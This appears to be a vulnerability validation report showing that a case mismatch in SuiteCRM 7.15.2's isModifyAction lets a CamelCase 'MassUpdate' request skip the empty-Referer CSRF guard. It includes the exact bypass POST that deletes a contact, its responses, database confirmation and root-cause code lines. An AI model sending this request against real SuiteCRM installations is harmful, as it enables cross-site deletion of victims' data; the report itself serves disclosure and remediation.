# VULN-088 — Action-name case-normalization mismatch defeats the CSRF referer guard

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: High
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28

## Preconditions
- An authenticated victim (any user; an **admin** victim maximizes impact). The exploit uses a disposable RegularUser victim and two Contacts the victim owns, so `ACLAccess('delete')` is satisfied and only disposable records are touched.
- The CSRF attacker is unauthenticated and rides the victim's session via a cross-site request that suppresses the `Referer` (standard `Referrer-Policy: no-referrer` / `rel=noreferrer` techniques). Simulated here by POSTing with **no `Referer` header**.

## Request
The bypass request (no Referer), see `request.http`:
```
POST /index.php
Cookie: PHPSESSID=<victim session>       (NO Referer header)
Content-Type: application/x-www-form-urlencoded

module=Contacts&action=MassUpdate&massupdate=true&uid=<id>&Delete=true&return_module=Contacts&return_action=index&current_query_by_page=%7B%7D
```
Control request is byte-identical except `action=massupdate` (lowercase).

## Response
See `response.txt`.
- `action=massupdate` (lowercase) → **HTTP 200** rendering `include/MVC/View/tpls/xsrf.tpl` ("possible attempt … cross site") → the empty-Referer CSRF guard **fired**; the targeted contact remained (`deleted=0`).
- `action=MassUpdate` (CamelCase) → **HTTP 301** redirect to the list (normal success) → guard **skipped**; the targeted contact was **deleted**.

DB ground truth (auditor cross-check):
```
CSRF_block   deleted=0   (lowercase request was blocked)
CSRF_bypass  deleted=1   (CamelCase request bypassed the guard and deleted it)
```

## Observation
Exactly matches the static finding. `isModifyAction()` at `SugarApplication.php:516` does `in_array($this->controller->action, $this->globalModifyActions)` with the **raw-case** action, but `$globalModifyActions` is all lowercase and dispatch lowercases the action (`SugarController.php:595`). `checkHTTPReferer()` only rejects an empty Referer when `isModifyAction()` is true, so the CamelCase canonical name (`MassUpdate`) — which the app's own UI uses — is never guarded. I confirmed the guard is active by default (`$strong = empty($sugar_config['http_referer']['weak'])` → true; no `http_referer.weak` set) by observing the lowercase request being blocked.

## Side effects
- Creates one disposable victim user and two Contacts (`<tag>_block`, `<tag>_bypass`); the exploit deletes only the `bypass` contact it created (soft-delete `deleted=1`). No demo data touched. `uid`-targeted, never `entire=true`.

## Research & references
- OWASP WSTG-SESS-05 (Testing for CSRF) and the OWASP CSRF Prevention cheat sheet — referer-based defenses are discouraged precisely because of normalization/bypass fragility; the recommended fix is a synchronizer token.
- PortSwigger Web Security Academy — "CSRF" (Referer-based defenses and their bypasses).
- CWE-178 (Improper Handling of Case Sensitivity) combined with CWE-352 (CSRF). SuiteCRM has a prior CSRF advisory (CVE-2023-3627) but not this specific `isModifyAction` case-mismatch.

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
n/a. (A fully cross-origin browser PoC — an auto-submitting form on an attacker origin with `Referrer-Policy: no-referrer` — would additionally demonstrate the end-to-end victim-click flow; the no-Referer POST proves the identical server-side guard gap.)
